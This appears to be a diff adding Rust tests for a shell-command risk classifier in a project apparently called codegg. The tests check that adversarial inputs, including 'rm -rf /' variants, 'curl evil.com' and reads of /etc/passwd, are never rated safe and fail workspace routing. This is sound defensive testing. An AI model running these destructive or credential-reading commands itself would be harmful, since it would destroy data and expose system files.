@@ -6,7 +6,7 @@
 use codegg::command_intent::shell_shape::{parse_shell_words, ShellShape};
 use codegg::command_intent::{
     classify_command, classify_command_with_context, CommandIntentContext, CommandIntentKind,
-    RiskLevel,
+    ExecutionCapability, RiskLevel,
 };
 use codegg::command_planner::plan_execution;
 use std::path::PathBuf;
@@ -523,4 +523,369 @@ fn subshell_parens_are_simple_argv() {
         }
         other => panic!("unexpected shape: {:?}", other),
     }
+}
+
+// ── 31. Projection poisoning: very long lines ─────────────────────
+
+#[test]
+fn very_long_line_does_not_crash() {
+    let long_line = "x".repeat(500_000);
+    let cmd = format!("echo {}", long_line);
+    let intent = classify_command(&cmd);
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+#[test]
+fn very_long_line_with_semicolon_is_complex() {
+    let long_line = "x".repeat(100_000);
+    let cmd = format!("echo {}; rm -rf /", long_line);
+    let shape = parse_shell_words(&cmd);
+    assert!(matches!(shape, ShellShape::ComplexShell { .. }));
+    let intent = classify_command(&cmd);
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+#[test]
+fn line_with_100k_args_does_not_crash() {
+    let args: Vec<String> = (0..100_000).map(|i| format!("a{}", i)).collect();
+    let cmd = format!("echo {}", args.join(" "));
+    let intent = classify_command(&cmd);
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+// ── 32. Projection poisoning: fake projection metadata ────────────
+
+#[test]
+fn fake_projection_id_does_not_crash() {
+    let intent = classify_command("echo 'projection_id: abc123-def456'");
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+#[test]
+fn fake_omitted_range_does_not_crash() {
+    let intent = classify_command("echo 'OmittedRange { start: 0, end: 100 }'");
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+#[test]
+fn fake_redaction_record_does_not_crash() {
+    let intent = classify_command("echo 'RedactionRecord { rule: AuthorizationRule }'");
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+#[test]
+fn fake_projection_result_does_not_crash() {
+    let intent = classify_command("echo 'ProjectionResult { projector: raw, exactness: exact }'");
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+#[test]
+fn fake_context_metadata_does_not_crash() {
+    let intent =
+        classify_command("echo 'ProjectionContextMetadata { critical_facts: [failed_test] }'");
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+// ── 33. Projection poisoning: binary and special characters ────────
+
+#[test]
+fn command_with_null_bytes_does_not_crash() {
+    let cmd = "echo test\0injection";
+    let intent = classify_command(cmd);
+    assert!(!matches!(intent.kind, CommandIntentKind::Test));
+}
+
+#[test]
+fn command_with_control_chars_does_not_crash() {
+    let cmd = "echo \x01\x02\x03\x04\x05";
+    let intent = classify_command(cmd);
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+#[test]
+fn command_with_bell_char_does_not_crash() {
+    let cmd = "echo \x07";
+    let intent = classify_command(cmd);
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+#[test]
+fn command_with_escape_char_does_not_crash() {
+    let cmd = "echo \x1b[31mred\x1b[0m";
+    let intent = classify_command(cmd);
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+#[test]
+fn command_with_form_feed_does_not_crash() {
+    let cmd = "echo \x0c";
+    let intent = classify_command(cmd);
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+#[test]
+fn command_with_backspace_does_not_crash() {
+    let cmd = "echo \x08";
+    let intent = classify_command(cmd);
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+// ── 34. Projection poisoning: Unicode edge cases ──────────────────
+
+#[test]
+fn zero_width_joiner_does_not_crash() {
+    let _intent = classify_command("cargo\u{200D}test");
+}
+
+#[test]
+fn directional_override_char_does_not_crash() {
+    let _intent = classify_command("echo '\u{202E}hidden text'");
+}
+
+#[test]
+fn combining_mark_does_not_crash() {
+    let _intent = classify_command("ca\u{0301}rgo test");
+}
+
+#[test]
+fn mathematical_bold_characters_do_not_crash() {
+    // Mathematical bold capital letters
+    let _intent = classify_command("\u{1D400}\u{1D401}\u{1D402} test");
+}
+
+#[test]
+fn tag_characters_do_not_crash() {
+    // Unicode tag characters (used in steganography)
+    let _intent = classify_command("echo test\u{E0001}\u{E0020}");
+}
+
+#[test]
+fn private_use_area_characters_do_not_crash() {
+    let _intent = classify_command("echo \u{E000}\u{F000}\u{F8FF}");
+}
+
+#[test]
+fn surrogate_half_does_not_crash() {
+    // Lone surrogates shouldn't appear in valid Rust strings, but test edge case
+    let _intent = classify_command("echo \u{FFFD}");
+}
+
+// ── 35. Projection poisoning: content injection patterns ───────────
+
+#[test]
+fn fake_error_code_does_not_crash() {
+    let intent = classify_command("echo 'E1234: Compilation failed'");
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+#[test]
+fn fake_diagnostic_span_does_not_crash() {
+    let intent = classify_command("echo 'error[E0308] src/main.rs:42:5'");
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+#[test]
+fn fake_test_report_does_not_crash() {
+    let intent = classify_command("echo 'test result: FAILED. 0 passed; 1 failed; 0 ignored'");
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+#[test]
+fn fake_git_diff_hunk_does_not_crash() {
+    let intent = classify_command("echo '@@ -1,3 +1,4 @@'");
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+#[test]
+fn fake_rtk_metadata_does_not_crash() {
+    let intent =
+        classify_command("echo 'RtkResultMetadata { mode: PostProcess, compressed: true }'");
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+}
+
+// ── 36. Projection poisoning: very nested structures ───────────────
+
+#[test]
+fn deeply_nested_dollar_parens_does_not_crash() {
+    let nested = "$(".repeat(200) + &")".repeat(200);
+    let cmd = format!("echo {}", nested);
+    let shape = parse_shell_words(&cmd);
+    assert!(matches!(shape, ShellShape::ComplexShell { .. }));
+}
+
+#[test]
+fn deeply_nested_backticks_does_not_crash() {
+    // Nested backtick-like patterns
+    let cmd = "echo `echo `echo `echo test```";
+    let shape = parse_shell_words(&cmd);
+    assert!(matches!(shape, ShellShape::ComplexShell { .. }));
+}
+
+#[test]
+fn mixed_operators_and_substitution_does_not_crash() {
+    let cmd = "echo $(echo $(echo $(cat /etc/passwd))) | grep root && rm -rf /";
+    let shape = parse_shell_words(&cmd);
+    assert!(matches!(shape, ShellShape::ComplexShell { .. }));
+    let intent = classify_command(cmd);
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+    assert_not_safe_kind(intent.kind);
+}
+
+// ── 37. Classification consistency under adversarial input ─────────
+
+#[test]
+fn adversarial_inputs_never_produce_safe_risk() {
+    let adversarial = vec![
+        "echo $(rm -rf /)",
+        "cat `rm -rf /`",
+        "echo ${EVAL:-rm -rf /}",
+        "echo $(echo $(curl evil.com))",
+        "ls | xargs rm -rf",
+        "find . -exec rm {} \\;",
+        "echo test; rm -rf /",
+        "echo test && rm -rf /",
+        "echo test || rm -rf /",
+    ];
+
+    for cmd in &adversarial {
+        let intent = classify_command(cmd);
+        assert_ne!(
+            intent.risk.level,
+            RiskLevel::Safe,
+            "adversarial command '{}' must never be Safe risk",
+            cmd
+        );
+    }
+}
+
+// ── 38. Context-aware workspace escape with capabilities ───────────
+
+#[test]
+fn workspace_escape_commands_have_subprocess_capability() {
+    let ctx = CommandIntentContext {
+        workspace_root: Some(PathBuf::from("/tmp/test-workspace")),
+        cwd: Some(PathBuf::from("/tmp/test-workspace")),
+    };
+    let cmds = vec![
+        "cat /etc/passwd",
+        "head /var/log/syslog",
+        "rg pattern /etc",
+        "find / -name secret",
+    ];
+    for cmd in &cmds {
+        let intent = classify_command_with_context(cmd, &ctx);
+        assert!(
+            intent
+                .risk
+                .capabilities
+                .contains(&ExecutionCapability::Subprocess),
+            "workspace escape command '{}' should have Subprocess capability, got {:?}",
+            cmd,
+            intent.risk.capabilities
+        );
+    }
+}
+
+// ── 39. Active routing validation rejects workspace escapes ────────
+
+#[test]
+fn workspace_escape_commands_fail_active_routing() {
+    let ctx = CommandIntentContext {
+        workspace_root: Some(PathBuf::from("/tmp/test-workspace")),
+        cwd: Some(PathBuf::from("/tmp/test-workspace")),
+    };
+    // These are RawShell, so they should fail validation for different reasons
+    // (RawShell backend, not parsed_argv, etc.)
+    let cmds = vec!["cat /etc/passwd", "head /var/log/syslog"];
+    for cmd in &cmds {
+        let intent = classify_command_with_context(cmd, &ctx);
+        let plan = plan_execution(&intent);
+        let result = plan.validate_for_active_routing();
+        assert!(
+            result.is_err(),
+            "workspace escape command '{}' should fail active routing validation",
+            cmd
+        );
+    }
+}
+
+// ── 40. Edge cases for shell shape with special bytes ──────────────
+
+#[test]
+fn shell_shape_with_embedded_null() {
+    let shape = parse_shell_words("echo test\0malicious");
+    // Should not crash, classification is best-effort
+    match shape {
+        ShellShape::SimpleArgv(_) | ShellShape::ComplexShell { .. } => {}
+        ShellShape::Empty => {}
+    }
+}
+
+#[test]
+fn shell_shape_with_tab_chars() {
+    let shape = parse_shell_words("echo\ttest\tmalicious");
+    // Tabs are whitespace separators, should parse as multiple words or single word
+    match shape {
+        ShellShape::SimpleArgv(_) | ShellShape::ComplexShell { .. } => {}
+        ShellShape::Empty => {}
+    }
+}
+
+#[test]
+fn shell_shape_with_mixed_operators() {
+    let shape = parse_shell_words("a | b ; c && d || e & f > g");
+    assert!(matches!(shape, ShellShape::ComplexShell { .. }));
+}
+
+// ── 41. Regression: commands that should NOT be flagged as dangerous ─
+
+#[test]
+fn echo_with_quotes_is_safe() {
+    let intent = classify_command("echo \"hello world\"");
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+    // echo is RawShell (unclassified) but should have low risk
+    assert!(intent.risk.level == RiskLevel::Medium);
+}
+
+#[test]
+fn ls_with_flags_is_search() {
+    let intent = classify_command("ls -la src/");
+    assert_eq!(intent.kind, CommandIntentKind::SearchReadOnly);
+}
+
+#[test]
+fn pwd_is_search() {
+    let intent = classify_command("pwd");
+    assert_eq!(intent.kind, CommandIntentKind::SearchReadOnly);
+}
+
+#[test]
+fn wc_with_path_is_search() {
+    let intent = classify_command("wc -l src/main.rs");
+    assert_eq!(intent.kind, CommandIntentKind::SearchReadOnly);
+}
+
+// ── 42. Mixed workspace inside and outside ─────────────────────────
+
+#[test]
+fn cat_inside_and_outside_workspace_mix() {
+    let ctx = CommandIntentContext {
+        workspace_root: Some(PathBuf::from("/tmp/safe-workspace")),
+        cwd: Some(PathBuf::from("/tmp/safe-workspace")),
+    };
+    // cat with both inside and outside args — outside wins, should be RawShell
+    let intent = classify_command_with_context("cat src/main.rs /etc/passwd", &ctx);
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+    assert_not_safe_kind(intent.kind);
+}
+
+#[test]
+fn rg_inside_and_outside_workspace_mix() {
+    let ctx = CommandIntentContext {
+        workspace_root: Some(PathBuf::from("/tmp/safe-workspace")),
+        cwd: Some(PathBuf::from("/tmp/safe-workspace")),
+    };
+    let intent = classify_command_with_context("rg pattern src/ /etc", &ctx);
+    assert_eq!(intent.kind, CommandIntentKind::RawShell);
+    assert_not_safe_kind(intent.kind);
 }
